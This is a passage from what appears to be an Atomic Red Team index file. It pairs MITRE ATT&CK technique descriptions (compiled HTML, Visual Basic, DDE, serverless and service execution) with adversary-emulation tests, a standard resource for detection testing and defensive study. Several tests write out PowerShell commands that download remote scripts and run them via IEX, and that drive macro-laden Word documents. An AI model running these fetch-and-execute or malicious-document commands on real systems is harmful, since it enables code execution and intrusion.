          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "#{input_file}"
      executor:
        command: 'cmd /r cmd<#{input_file}

          '
        name: command_prompt
        elevation_required: false
  T1223:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a
      type: attack-pattern
      created: '2018-10-17T00:14:20.652Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1223
        url: https://attack.mitre.org/techniques/T1223
      - source_name: Microsoft HTML Help May 2018
        description: Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved
          October 3, 2018.
        url: https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk
      - source_name: Microsoft HTML Help ActiveX
        description: Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved
          October 3, 2018.
        url: https://msdn.microsoft.com/windows/desktop/ms644670
      - url: https://msdn.microsoft.com/windows/desktop/ms524405
        description: Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved
          October 3, 2018.
        source_name: Microsoft HTML Help Executable Program
      - url: https://msitpros.com/?p=3909
        description: Moe, O. (2017, August 13). Bypassing Device guard UMCI using
          CHM – CVE-2017-8625. Retrieved October 3, 2018.
        source_name: MsitPros CHM Aug 2017
      - url: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625
        description: Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer
          Security Feature Bypass Vulnerability. Retrieved October 3, 2018.
        source_name: Microsoft CVE-2017-8625 Aug 2017
      modified: '2020-01-31T18:59:00.845Z'
      name: Compiled HTML File
      description: |-
        Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

        Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.

        Monitor presence and use of CHM files, especially if they are not typically used within an environment.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Application whitelisting
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1651:
    technique:
      modified: '2023-04-14T19:01:12.963Z'
      name: Cloud Administration Command
      description: |-
        Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD.(Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)

        If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - Cisco
      - Nichols Jasper
      - Jared Wilson
      - Caio Silva
      - Adrien Bataille
      - Anders Vejlby
      - Nader Zaveri
      x_mitre_deprecated: false
      x_mitre_detection: ''
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - IaaS
      - Azure AD
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7
      created: '2023-03-13T15:26:11.741Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1651
        external_id: T1651
      - source_name: SpecterOps Lateral Movement from Azure to On-Prem AD 2020
        description: 'Andy Robbins. (2020, August 17). Death from Above: Lateral Movement
          from Azure to On-Prem AD. Retrieved March 13, 2023.'
        url: https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d
      - source_name: AWS Systems Manager Run Command
        description: AWS. (n.d.). AWS Systems Manager Run Command. Retrieved March
          13, 2023.
        url: https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html
      - source_name: MSTIC Nobelium Oct 2021
        description: Microsoft Threat Intelligence Center. (2021, October 25). NOBELIUM
          targeting delegated administrative privileges to facilitate broader attacks.
          Retrieved March 25, 2022.
        url: https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/
      - source_name: Microsoft Run Command
        description: Microsoft. (2023, March 10). Run scripts in your VM by using
          Run Command. Retrieved March 13, 2023.
        url: https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1059.005:
    technique:
      modified: '2023-04-07T17:13:03.738Z'
      name: 'Command and Scripting Interpreter: Visual Basic'
      description: |-
        Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

        Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)

        Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.

        Understanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_version: '1.4'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Module: Module Load'
      - 'Script: Script Execution'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67
      created: '2020-03-09T14:29:51.508Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1059/005
        external_id: T1059.005
      - source_name: VB .NET Mar 2020
        description: ".NET Team. (2020, March 11). Visual Basic support planned for
          .NET 5.0. Retrieved June 23, 2020."
        url: https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/
      - source_name: 'Default VBS macros Blocking '
        description: 'Kellie Eickmeyer. (2022, February 7). Helping users stay safe:
          Blocking internet macros by default in Office. Retrieved February 7, 2022.'
        url: https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805
      - source_name: Microsoft VBScript
        description: Microsoft. (2011, April 19). What Is VBScript?. Retrieved March
          28, 2020.
        url: https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)
      - source_name: Microsoft VBA
        description: Microsoft. (2019, June 11). Office VBA Reference. Retrieved June
          23, 2020.
        url: https://docs.microsoft.com/office/vba/api/overview/
      - source_name: VB Microsoft
        description: Microsoft. (n.d.). Visual Basic documentation. Retrieved June
          23, 2020.
        url: https://docs.microsoft.com/dotnet/visual-basic/
      - source_name: Wikipedia VBA
        description: Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August
          13, 2020.
        url: https://en.wikipedia.org/wiki/Visual_Basic_for_Applications
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1059.005
    atomic_tests:
    - name: Visual Basic script execution to gather local computer information
      auto_generated_guid: 1620de42-160a-4fe5-bbaf-d3fef0181ce9
      description: |-
        Visual Basic execution test, execute vbscript via PowerShell.

        When successful, system information will be written to $env:TEMP\T1059.005.out.txt.
      supported_platforms:
      - windows
      input_arguments:
        vbscript:
          description: Path to sample script
          type: string
          default: PathToAtomicsFolder\T1059.005\src\sys_info.vbs
      dependency_executor_name: powershell
      dependencies:
      - description: Sample script must exist on disk at specified location (#{vbscript})
        prereq_command: 'if (Test-Path #{vbscript}) {exit 0} else {exit 1} '
        get_prereq_command: |-
          New-Item -ItemType Directory (Split-Path #{vbscript}) -Force | Out-Null
          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.005/src/sys_info.vbs" -OutFile "#{vbscript}"
      executor:
        command: 'cscript #{vbscript} > $env:TEMP\T1059.005.out.txt'
        cleanup_command: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
        name: powershell
    - name: Encoded VBS code execution
      auto_generated_guid: e8209d5f-e42d-45e6-9c2f-633ac4f1eefa
      description: |
        This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
        a message box will pop up displaying "ART T1059.005"

        A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
        You can validate this by opening WinWord -> File -> Account -> About Word
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'The 64-bit version of Microsoft Office must be installed

          '
        prereq_command: |
          try {
            $wdApp = New-Object -COMObject "Word.Application"
            $path = $wdApp.Path
            Stop-Process -Name "winword"
            if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft Word (64-bit)
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
        cleanup_command: 'Get-WmiObject win32_process | Where-Object {$_.CommandLine
          -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null

          '
        name: powershell
    - name: Extract Memory via VBA
      auto_generated_guid: 8faff437-a114-4547-9a60-749652a03df6
      description: |
        This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
        we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
        memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.
      supported_platforms:
      - windows
      input_arguments:
        ms_product:
          description: Maldoc application Word
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
          -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\"
          -officeProduct \"Word\" -sub \"Extract\"\n"
        cleanup_command: 'Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin"
          -ErrorAction Ignore

          '
        name: powershell
  T1151:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Erye Hernandez, Palo Alto Networks
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1151
        url: https://attack.mitre.org/techniques/T1151
      - external_id: CAPEC-649
        source_name: capec
        url: https://capec.mitre.org/data/definitions/649.html
      - url: https://arstechnica.com/security/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/
        description: Dan Goodin. (2016, July 6). After hiatus, in-the-wild Mac backdoors
          are suddenly back. Retrieved July 8, 2017.
        source_name: Mac Backdoors are back
      modified: '2020-02-10T20:49:12.897Z'
      name: Space after Filename
      description: "Adversaries can hide a program's true filetype by changing the
        extension of a file. With certain file types (specifically this does not work
        with .app extensions), appending a space to the end of a filename will change
        how the file is processed by the operating system. For example, if there is
        a Mach-O executable file called evil.bin, when it is double clicked by a user,
        it will launch Terminal.app and execute. If this file is renamed to evil.txt,
        then when double clicked by a user, it will launch with the default text editing
        application (not executing the binary). However, if the file is renamed to
        \"evil.txt \" (note the space at the end), then when double clicked by a user,
        the true file type is determined by the OS and handled appropriately and the
        binary will be executed (Citation: Mac Backdoors are back). \n\nAdversaries
        can use this feature to trick users into double clicking benign-looking files
        of any format and ultimately executing something malicious."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: It's not common for spaces to be at the end of filenames,
        so this is something that can easily be checked with file monitoring. From
        the user's perspective though, this is very hard to notice from within the
        Finder.app or on the command-line in Terminal.app. Processes executed from
        binaries containing non-standard extensions in the filename are suspicious.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1648:
    technique:
      modified: '2022-10-24T15:21:55.001Z'
      name: Serverless Execution
      description: "Adversaries may abuse serverless computing, integration, and automation
        services to execute arbitrary code in cloud environments. Many cloud providers
        offer a variety of serverless resources, including compute engines, application
        integration services, and web servers. \n\nAdversaries may abuse these resources
        in various ways as a means of executing arbitrary commands. For example, adversaries
        may use serverless functions to execute malicious code, such as crypto-mining
        malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation:
        Cado Security Denonia) Adversaries may also create functions that enable further
        compromise of the cloud environment. For example, an adversary may use the
        `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission
        in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)
        to a serverless cloud function, which may then be able to perform actions
        the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation:
        Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can
        also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)),
        potentially enabling persistent execution over time. For example, in AWS environments,
        an adversary may create a Lambda function that automatically adds [Additional
        Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user
        and a corresponding CloudWatch events rule that invokes that function whenever
        a new user is created.(Citation: Backdooring an AWS account) Similarly, an
        adversary may create a Power Automate workflow in Office 365 environments
        that forwards all emails a user receives or creates anonymous sharing links
        whenever a user is granted access to a document in SharePoint.(Citation: Varonis
        Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: ''
      x_mitre_platforms:
      - SaaS
      - IaaS
      - Office 365
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.0'
      x_mitre_contributors:
      - Shailesh Tiwary (Indian Army)
      - Praetorian
      - Oleg Kolesnikov, Securonix
      - Cisco
      - Varonis Threat Labs
      - Alex Soler, AttackIQ
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Cloud Service: Cloud Service Modification'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--e848506b-8484-4410-8017-3d235a52f5b3
      created: '2022-05-27T13:19:51.112Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1648
        external_id: T1648
      - source_name: Microsoft DART Case Report 001
        description: Berk Veral. (2020, March 9). Real-life cybercrime stories from
          DART, the Microsoft Detection and Response Team. Retrieved May 27, 2022.
        url: https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
      - source_name: Backdooring an AWS account
        description: Daniel Grzelak. (2016, July 9). Backdooring an AWS account. Retrieved
          May 27, 2022.
        url: https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
      - source_name: Varonis Power Automate Data Exfiltration
        description: Eric Saraga. (2022, February 2). Using Power Automate for Covert
          Data Exfiltration in Microsoft 365. Retrieved May 27, 2022.
        url: https://www.varonis.com/blog/power-automate-data-exfiltration
      - source_name: Cado Security Denonia
        description: 'Matt Muir. (2022, April 6). Cado Discovers Denonia: The First
          Malware Specifically Targeting Lambda. Retrieved May 27, 2022.'
        url: https://www.cadosecurity.com/cado-discovers-denonia-the-first-malware-specifically-targeting-lambda/
      - source_name: Rhino Security Labs AWS Privilege Escalation
        description: Rhino Security Labs. (n.d.). AWS IAM Privilege Escalation – Methods
          and Mitigation. Retrieved May 27, 2022.
        url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
      - source_name: Rhingo Security Labs GCP Privilege Escalation
        description: Spencer Gietzen. (n.d.). Privilege Escalation in Google Cloud
          Platform – Part 1 (IAM). Retrieved May 27, 2022.
        url: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1173:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1173
        url: https://attack.mitre.org/techniques/T1173
      - url: https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/
        description: Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature
          in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.
        source_name: BleepingComputer DDE Disabled in Word Dec 2017
      - url: https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021
        description: Microsoft. (2017, December 12). ADV170021 - Microsoft Office
          Defense in Depth Update. Retrieved February 3, 2018.
        source_name: Microsoft ADV170021 Dec 2017
      - url: https://technet.microsoft.com/library/security/4053440
        description: Microsoft. (2017, November 8). Microsoft Security Advisory 4053440
          - Securely opening Microsoft Office documents that contain Dynamic Data
          Exchange (DDE) fields. Retrieved November 21, 2017.
        source_name: Microsoft DDE Advisory Nov 2017
      - url: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/
        description: El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The
          Power Within. Retrieved November 22, 2017.
        source_name: SensePost PS DDE May 2016
      - url: https://www.contextis.com/blog/comma-separated-vulnerabilities
        description: Kettle, J. (2014, August 29). Comma Separated Vulnerabilities.
          Retrieved November 22, 2017.
        source_name: Kettle CSV DDE Aug 2014
      - url: https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee
        description: 'Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and
          Excel for Code Execution. Retrieved February 3, 2018.'
        source_name: Enigma Reviving DDE Jan 2018
      - url: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
        description: Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code
          Exec in MSWord. Retrieved November 21, 2017.
        source_name: SensePost MacroLess DDE Oct 2017
      - url: https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/
        description: NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents.
          Retrieved November 21, 2017.
        source_name: NVisio Labs DDE Detection Oct 2017
      modified: '2022-02-09T20:22:43.284Z'
      name: Dynamic Data Exchange
      description: |-
        Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

        Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        OLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution. (Citation: NVisio Labs DDE Detection Oct 2017)

        Monitor for Microsoft Office applications loading DLLs and other modules not typically associated with the application.

        Monitor for spawning of unusual processes (such as cmd.exe) from Microsoft Office applications.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1204.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9
      type: attack-pattern
      created: '2020-03-11T14:43:31.706Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1204.001
        url: https://attack.mitre.org/techniques/T1204/001
      modified: '2020-03-11T14:43:31.706Z'
      name: Malicious Link
      description: An adversary may rely upon a user clicking a malicious link in
        order to gain execution. Users may be subjected to social engineering to get
        them to click on a link that will lead to code execution. This user action
        will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002).
        Clicking on a link may also lead to other execution techniques such as exploitation
        of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).
        Links may also lead users to download files that require execution via [Malicious
        File](https://attack.mitre.org/techniques/T1204/002).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.

        Anti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1569.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4
      type: attack-pattern
      created: '2020-03-10T18:33:36.159Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1569.002
        url: https://attack.mitre.org/techniques/T1569/002
      - source_name: Microsoft Service Control Manager
        url: https://docs.microsoft.com/windows/win32/services/service-control-manager
        description: Microsoft. (2018, May 31). Service Control Manager. Retrieved
          March 28, 2020.
      - url: https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
        description: Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11.
          Retrieved May 13, 2015.
        source_name: Russinovich Sysinternals
      modified: '2021-08-30T17:42:40.945Z'
      name: 'System Services: Service Execution'
      description: |-
        Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

        [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

        Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: Changes to service Registry entries and command line invocation
        of tools capable of modifying services that do not correlate with known software,
        patch cycles, etc., may be suspicious. If a service is used only to execute
        a binary or script and not to persist, then it will likely be changed back
        to its original form shortly after the service is restarted so the service
        is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Service: Service Creation'
      - 'Command: Command Execution'
      - 'Windows Registry: Windows Registry Key Modification'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_remote_support: true
      identifier: T1569.002
    atomic_tests:
